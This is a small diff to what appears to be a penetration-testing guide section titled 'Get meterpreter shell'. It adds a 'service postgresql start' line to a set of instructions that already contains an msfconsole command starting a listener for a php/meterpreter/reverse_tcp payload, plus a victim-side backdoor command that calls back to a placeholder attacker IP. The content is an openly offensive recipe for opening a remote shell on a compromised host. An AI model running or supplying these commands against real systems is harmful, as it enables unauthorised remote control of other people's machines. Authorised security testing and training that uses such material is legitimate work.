@@ -26,6 +26,7 @@ Get meterpreter shell
 -------------------------
 ```bash
 # On attacker run
+service postgresql start
 msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST <attacker.ip.address>; set PORT 1234; run"
 # On Victim run
 :backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost <attacker.ip.address> -port 1234
